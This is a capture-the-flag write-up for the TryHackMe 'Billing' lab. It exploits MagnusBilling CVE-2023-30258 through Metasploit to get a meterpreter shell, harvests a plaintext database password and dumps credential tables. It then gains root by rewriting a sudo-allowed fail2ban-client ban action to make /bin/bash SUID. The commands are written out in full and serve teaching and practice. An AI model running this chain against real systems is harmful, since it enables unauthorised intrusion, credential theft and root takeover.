# Billing - TryHackMe Writeup

**Target:** `TARGET_IP` (10.130.173.152 at time of solve)
**OS:** Linux (Debian)
**Difficulty:** Easy
**Tech stack:** Apache 2.4.62, `/mbilling` (MagnusBilling), MariaDB, Asterisk Manager
**Exploit chain:** MagnusBilling CVE-2023-30258 ? DB-config creds ? `sudo fail2ban-client` abuse ? SUID `bash` root

---

## Attack Chain Overview

```
nmap ? 22/tcp SSH, 80/tcp Apache, 3306/tcp MySQL, 5038/tcp Asterisk AMI
    ?
whatweb ? Apache redirects to /mbilling/  (MagnusBilling fingerprint)
    ?
Metasploit  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
    ?
meterpreter as `asterisk`
    ?
grep /etc/asterisk/ ? res_config_mysql.conf leaks mbillingUser:BLOGYwvtJkI7uaX5
    ?
mysqldump mbilling ? pkg_user SHA-1 (uncrackable in rockyou) + SMTP / SIP / API creds
    ?
sudo -l ? NOPASSWD /usr/bin/fail2ban-client
    ?
fail2ban-client set sshd action ... actionban "chmod +s /bin/bash" + banip <x>
    ?
bash -p ? root
    ?
cat /root/root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Triage](#2-web-triage)
3. [Initial Access  MagnusBilling CVE-2023-30258](#3-initial-access--magnusbilling-cve-2023-30258)
4. [Post-Exploitation Enumeration (`asterisk`)](#4-post-exploitation-enumeration-asterisk)
5. [Database Looting](#5-database-looting)
6. [Privilege Escalation  `sudo fail2ban-client` ? root](#6-privilege-escalation--sudo-fail2ban-client--root)
7. [Root Flag](#7-root-flag)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. Reconnaissance

Full TCP sweep, then service detection on the open ports:

```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sS -p- -n -Pn $TARGET
nmap -sVC -p22,80,3306,5038 $TARGET -oA service
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | Linux login |
| 80/tcp | Apache 2.4.62 (Debian) | Redirects to `/mbilling` |
| 3306/tcp | MariaDB / MySQL | Bound to localhost from the outside |
| 5038/tcp | Asterisk Call Manager (AMI) | PBX management socket |

**Signal:** port `5038` + HTTP ? MagnusBilling (Asterisk-based VoIP billing frontend). That product has a well-known unauth RCE  CVE-2023-30258  in the `icepay` module.

---

## 2. Web Triage

```bash
whatweb http://$TARGET/
# Apache[2.4.62], HTTPServer[Debian Linux], RedirectLocation[./mbilling]
```

Browser hits `/mbilling/` ? the MagnusBilling login page. No credentials needed; the RCE is pre-auth.

Directory brute just to confirm the app layout (optional):

```bash
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
feroxbuster -u http://$TARGET/mbilling/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
```

---

## 3. Initial Access  MagnusBilling CVE-2023-30258

Metasploit ships the exploit module. Full playbook in [magnusbilling-rce.md](../../exploits/web-rce/magnusbilling-rce.md).

```bash
# What it does: usa herramientas de Metasploit para preparar exploit o payload.
# Why here: generar o lanzar el payload necesario.
msfconsole
search magnusbilling
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS $TARGET
set TARGETURI /mbilling/
set LHOST tun0
run
```

Drops a **meterpreter as `asterisk`**. Stabilise the shell immediately:

```bash
shell
bash -i
export TERM=xterm-256color
# What it does: executes a Windows command line action.
# Why here: enumerate, transfer, replace or validate artifacts on the victim.
whoami          # asterisk
id
uname -a
```

---

## 4. Post-Exploitation Enumeration (`asterisk`)

First pass of the [Linux enumeration playbook](../../exploits/enumeration/linux-enumeration.md)  system context + `sudo -l` + credential hunt.

### System context & sudo
```bash
id
uname -a
# What it does: lists sudo privileges of the current or specified user.
# Why here: encontrar comandos permitidos para escalar privilegios.
sudo -l
# User asterisk may run the following commands on HOST:
#     (root) NOPASSWD: /usr/bin/fail2ban-client
# Defaults!/usr/bin/fail2ban-client !requiretty
```

`fail2ban-client` NOPASSWD is the privesc lever  parked for step 6.

### Credential hunt on disk

```bash
# Any file referencing MySQL connection helpers
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -type f -exec grep -l -i "mysql_connect\|mysqli_connect\|PDO\|DB_PASSWORD\|MYSQL_PASSWORD" {} \; 2>/dev/null

# Config files with cleartext passwords
find / -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.cnf" \) \
  -exec grep -l -i "password\|passwd\|pwd" {} \; 2>/dev/null

# Narrow pass over web roots
find /var/www/html /home/*/public_html /opt/lampp/htdocs -type f \
  \( -name "*.php" -o -name "*.inc" -o -name "config*.php" \) \
  -exec grep -H -i "mysql\|password\|db_user" {} \; 2>/dev/null
```

The high-signal hit:

```
/etc/asterisk/res_config_mysql.conf
```

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /etc/asterisk/res_config_mysql.conf
# dbhost = localhost
# dbname = mbilling
# dbuser = mbillingUser
# dbpass = BLOGYwvtJkI7uaX5
```

### User flag
The user flag lives at `/home/asterisk/user.txt`.

---

## 5. Database Looting

Remote MySQL is filtered (confirmed by `mysql -h $TARGET -u mbillingUser --password=...`), so everything goes through the local client in the meterpreter session. Tool note: [mysql.md](../../tools/database/mysql.md).

### Full dump
```bash
# What it does: usa un cliente o herramienta de volcado de base de datos.
# Why here: enumerar datos y extraer credenciales o estado de la app.
mysqldump -u mbillingUser -p'BLOGYwvtJkI7uaX5' mbilling > /tmp/mbilling_backup.sql
```

### Target the interesting tables
```bash
# Admin / operator accounts (SHA-1 hashes)
# What it does: usa un cliente o herramienta de volcado de base de datos.
# Why here: enumerar datos y extraer credenciales o estado de la app.
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -D mbilling -e "SELECT * FROM pkg_user;" > /tmp/usuarios.txt

# Remote Asterisk servers
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_servers;"

# SIP extensions with per-extension secrets
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e \
  "SELECT id, name, secret, host, context FROM mbilling.pkg_sip LIMIT 20;"

# IAX trunks
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_iax LIMIT 10;"

# SMTP creds (often reused)
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_smtp;"
# ? mail.magnusbilling.com  billing@magnusbilling.com  magnus  587

# REST API keys
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_api;"
```

### Admin hash found
```
root : d8c55b020bca07272d4cf3a46d693bb6ebafe3e1
```

Raw SHA-1 ? hashcat mode 100:

```bash
# What it does: cracks hashes with the specified mode and wordlist.
# Why here: recuperar credenciales o confirmar que no estan en la lista.
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

Not in rockyou. Not worth deeper cracking  the privesc lever is already in `sudo -l`.

Loot transfer from meterpreter:
```
meterpreter > download /tmp/usuarios.txt
meterpreter > download /tmp/mbilling_backup.sql
```

---

## 6. Privilege Escalation  `sudo fail2ban-client` ? root

Full technique note: [fail2ban-sudo-privesc.md](../../exploits/privesc-linux/fail2ban-sudo-privesc.md).

`fail2ban-server` runs as root. `fail2ban-client` (sudo-allowed here) can overwrite the `actionban` shell snippet of an existing jail. Any later ban triggers the snippet **as root**.

```bash
# 1. Hijack the sshd jail's ban action
# What it does: modifica o dispara fail2ban via sudo.
# Why here: abusar el cliente administrativo permitido para ejecutar acciones como root.
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
  actionban "chmod +s /bin/bash"

# 2. Force a ban to fire our action
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4

# 3. Verify bash is now SUID root
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

# 4. Get a privileged shell
bash -p
# What it does: executes a Windows command line action.
# Why here: enumerate, transfer, replace or validate artifacts on the victim.
whoami          # root
id
```

---

## 7. Root Flag

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /root/root.txt
cat /root/passwordMysql.log     # dropped during setup, another loot file
```

---

## 8. Key Takeaways

- `/mbilling/` + port 5038 is the MagnusBilling fingerprint  CVE-2023-30258 before anything else.
- Asterisk boxes keep DB creds in plaintext at `/etc/asterisk/res_config_mysql.conf`. Always grep `/etc/` after landing as `asterisk`.
- MagnusBilling's `pkg_user.password` is raw SHA-1  attempt `hashcat -m 100` but don't sink hours into it; the privesc lever is usually elsewhere.
- `fail2ban-client` under sudo is a wildcard-command primitive. Treat any `fail2ban-client` entry in `sudo -l` as instant root.
- `bash -p` is what preserves the SUID-root EUID  `bash` alone resets it.

---

## Related Notes
- [magnusbilling-rce.md](../../exploits/web-rce/magnusbilling-rce.md)  exploit playbook
- [fail2ban-sudo-privesc.md](../../exploits/privesc-linux/fail2ban-sudo-privesc.md)  privesc playbook
- [mysql](../../tools/database/mysql.md)  DB enumeration tool note
- [metasploit](../../tools/exploitation/metasploit.md)  public-exploit delivery
- [hashcat](../../tools/creds/hashcat.md)  SHA-1 mode 100
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md)  post-foothold checklist
- [nmap](../../tools/recon/nmap.md), [whatweb](../../tools/recon/whatweb.md), [feroxbuster](../../tools/fuzz/feroxbuster.md)  recon


